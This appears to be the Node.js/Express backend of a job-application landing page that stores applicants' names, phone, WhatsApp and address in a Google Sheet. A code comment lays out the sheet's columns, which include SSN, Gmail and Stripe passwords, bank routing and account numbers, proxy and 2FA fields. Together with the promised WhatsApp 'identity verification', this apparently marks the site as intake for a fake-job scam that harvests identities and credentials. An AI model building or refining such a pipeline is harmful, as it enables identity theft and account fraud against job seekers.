require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const multer = require('multer');
const { google } = require('googleapis');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 8080;

// Google Sheets configuration
const GOOGLE_SHEET_ID = process.env.GOOGLE_SHEET_ID;
const CREDENTIALS_PATH = path.join(__dirname, 'credentials', 'google-service-account.json');

// Initialize Google Sheets API
let sheets;
try {
  let credentials;
  
  // Try environment variable first (for deployment)
  if (process.env.GOOGLE_SERVICE_ACCOUNT_JSON) {
    credentials = JSON.parse(process.env.GOOGLE_SERVICE_ACCOUNT_JSON);
    console.log('✅ Using Google credentials from environment variable');
  } 
  // Fallback to file (for local development)
  else if (fs.existsSync(CREDENTIALS_PATH)) {
    credentials = JSON.parse(fs.readFileSync(CREDENTIALS_PATH));
    console.log('✅ Using Google credentials from file');
  } 
  else {
    throw new Error('No Google service account credentials found');
  }
  
  const auth = new google.auth.GoogleAuth({
    credentials,
    scopes: ['https://www.googleapis.com/auth/spreadsheets']
  });
  sheets = google.sheets({ version: 'v4', auth });
  console.log('✅ Google Sheets API initialized successfully');
} catch (error) {
  console.error('❌ Failed to initialize Google Sheets API:', error.message);
}



// Google Sheets helper function
async function saveToGoogleSheets(leadData) {
  if (!sheets || !GOOGLE_SHEET_ID) {
    throw new Error('Google Sheets not configured');
  }

  // Map to your existing column structure:
  // A: FULL NAME, B: STRIPE, C: STRIPE PASS., D: EMAIL, E: PHONE, F: WHATSAPP, 
  // G: ADDRESS, H: DATE OF BIRTH, I: SSN, J: GMAIL, K: GMAIL PASS., L: ROUTING #, 
  // M: ACC #, N: APPLICATION ID, O: SUBMISSION DATE, P: STATUS, Q: PROXY, R: 2FA
  const values = [[
    leadData.fullName,     // A: FULL NAME
    '',                    // B: STRIPE (empty)
    '',                    // C: STRIPE PASS. (empty)
    leadData.email,        // D: EMAIL
    leadData.phone,        // E: PHONE
    leadData.whatsapp,     // F: WHATSAPP
    leadData.address,      // G: ADDRESS
    '',                    // H: DATE OF BIRTH (empty)
    '',                    // I: SSN (empty)
    '',                    // J: GMAIL (empty)
    '',                    // K: GMAIL PASS. (empty)
    '',                    // L: ROUTING # (empty)
    '',                    // M: ACC # (empty)
    leadData.applicationId, // N: APPLICATION ID
    new Date().toISOString(), // O: SUBMISSION DATE
    'New Lead',            // P: STATUS
    '',                    // Q: PROXY (empty)
    ''                     // R: 2FA (empty)
  ]];

  await sheets.spreadsheets.values.append({
    spreadsheetId: GOOGLE_SHEET_ID,
    range: 'A:R',
    valueInputOption: 'RAW',
    resource: { values }
  });
}

// Configure multer for form data handling
const upload = multer();

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Static files - serve everything from root
app.use(express.static(__dirname));



// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/health', (req, res) => {
  try {
    res.json({ 
      status: 'OK', 
      timestamp: new Date().toISOString(),
      environment: process.env.NODE_ENV || 'development',
      port: PORT,
      uptime: process.uptime(),
      googleSheetsConfigured: !!(sheets && GOOGLE_SHEET_ID)
    });
  } catch (error) {
    console.error('Health check failed:', error);
    res.status(500).json({
      status: 'ERROR',
      message: 'Health check failed',
      error: error.message
    });
  }
});

// Application submission endpoint
app.post('/api/submit-application', upload.none(), async (req, res) => {
  try {
    const { 
      email, firstName, lastName, phone, whatsapp, 
      street, city, state, zipCode, country 
    } = req.body;
    
    const fullName = `${firstName} ${lastName}`;
    const address = `${street}, ${city}, ${state} ${zipCode}, ${country}`;
    const applicationId = 'APP-' + Date.now();
    
    // Save to Google Sheets
    await saveToGoogleSheets({
      fullName,
      email,
      phone,
      whatsapp,
      address,
      applicationId
    });
    
    console.log('=== New Lead Saved to Google Sheets ===');
    console.log('Name:', fullName);
    console.log('Email:', email);
    console.log('Phone:', phone);
    console.log('WhatsApp:', whatsapp);
    console.log('Address:', address);
    console.log('=====================================');
    
    setTimeout(() => {
      res.json({ 
        success: true, 
        message: 'Application submitted successfully! A representative will contact you via WhatsApp within 48-72 hours.',
        applicationId,
        applicantFolder: `${new Date().toISOString().slice(0, 10)}_${fullName.toLowerCase().replace(/\s+/g, '-')}`,
        nextSteps: [
          'Keep your WhatsApp active and ready to receive messages',
          'A representative will contact you within 48-72 hours',
          'Identity verification will be conducted via WhatsApp video call',
          'Interview will be scheduled after successful verification',
          'Hiring and onboarding will begin if all goes well'
        ]
      });
    }, 1500);
    
  } catch (error) {
    console.error('Application submission error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'There was an error processing your application. Please try again.' 
    });
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Server error:', error);
  res.status(500).json({
    success: false,
    message: 'Internal server error. Please try again later.'
  });
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Customer Service Landing Page Server running on port ${PORT}`);
  console.log(`📍 Local URL: http://localhost:${PORT}`);
  console.log(`📁 Serving static files from: ${__dirname}`);
  console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🔧 Railway Deploy: ${process.env.RAILWAY_ENVIRONMENT_NAME || 'local'}`);
  console.log(`✅ Server startup complete - Ready to accept connections`);
}); 